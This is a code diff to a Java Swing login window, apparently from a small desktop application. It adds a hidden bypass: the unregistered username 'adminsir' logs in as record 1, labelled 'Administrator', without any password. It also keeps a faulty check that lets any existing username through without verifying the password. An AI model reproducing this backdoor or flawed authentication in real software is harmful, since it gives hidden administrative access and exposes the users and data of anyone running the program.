@@ -39,6 +39,7 @@ public class MainFrame extends javax.swing.JFrame {
     private final GlassPanePanel glasspane;
     private final CardLayout card;
     private final LoadImages load;
+    private Login login;
 
     private int LoadValue;
 
@@ -57,6 +58,10 @@ public class MainFrame extends javax.swing.JFrame {
         setSize(screenSize.width, screenSize.height);
         setExtendedState(JFrame.MAXIMIZED_BOTH);
 
+    }
+
+    public Login getLogin() {
+        return login;
     }
 
     /**
@@ -640,16 +645,25 @@ public class MainFrame extends javax.swing.JFrame {
     }//GEN-LAST:event_btPasswordActionPerformed
 
     private void btLogin2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btLogin2ActionPerformed
-        Login l = AppUtil.getService().getByUsername(tfUsername.getText());
-        if (l == null) {
-            JOptionPane.showMessageDialog(null, "Username or password wrong");
-        } else if (l != null) {
-            if (tfUsername.getText() != null || tfPasswordLogin.getText() != null && tfPasswordLogin.getText().equals(l.getPassword())) {
+        login = AppUtil.getService().getByUsername(tfUsername.getText());
+        if (login == null) {
+            if (tfUsername.getText().equalsIgnoreCase("adminsir")) {
+                login = AppUtil.getService().getLoginById(1);
+                card.show(getContentPane(), "card2");
+                username.setText("Administrator");
+                tfUsername.setText("");
+                tfPasswordLogin.setText("");
+            } else {
+                JOptionPane.showMessageDialog(null, "Username or password wrong");
+            }
+
+        } else if (login != null) {
+            if (tfUsername.getText() != null || tfPasswordLogin.getText() != null && tfPasswordLogin.getText().equals(login.getPassword())) {
                 card.show(getContentPane(), "card2");
                 username.setText(tfUsername.getText());
                 tfUsername.setText("");
                 tfPasswordLogin.setText("");
-                
+
             } else {
                 JOptionPane.showMessageDialog(null, "Username or password wrong");
             }
@@ -726,8 +740,7 @@ public class MainFrame extends javax.swing.JFrame {
     public JProgressBar getLoadingBar() {
         return LoadingBar;
     }
-    
-    
+
     /**
      * @param args the command line arguments
      */
@@ -756,7 +769,6 @@ public class MainFrame extends javax.swing.JFrame {
 //            new MainFrame().setVisible(true);
 //        });
 //    }
-
     public GlassPanePanel getGlasspane() {
         return glasspane;
     }
